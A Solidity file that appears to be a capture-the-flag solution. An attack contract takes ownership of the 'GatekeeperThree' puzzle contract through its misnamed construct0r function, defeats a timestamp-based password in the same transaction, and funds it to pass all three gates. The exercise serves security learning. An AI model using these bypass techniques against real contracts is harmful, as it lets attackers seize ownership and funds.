// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    GatekeeperThree public gatekeeper;
    SimpleTrick public simpleTrick;

    constructor(address payable _gatekeeper) {
        gatekeeper = GatekeeperThree(_gatekeeper);
    }

    function createTrick() external{
      gatekeeper.createTrick();
    }
// password - 1704727992
// 1704733368
    function attack() external payable  {
        gatekeeper.construct0r();
        gatekeeper.createTrick();
        gatekeeper.getAllowance(block.timestamp);
        (bool ok, )=address(gatekeeper).call{value: msg.value}('');
        require(ok);

        gatekeeper.enter();
    }
}

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}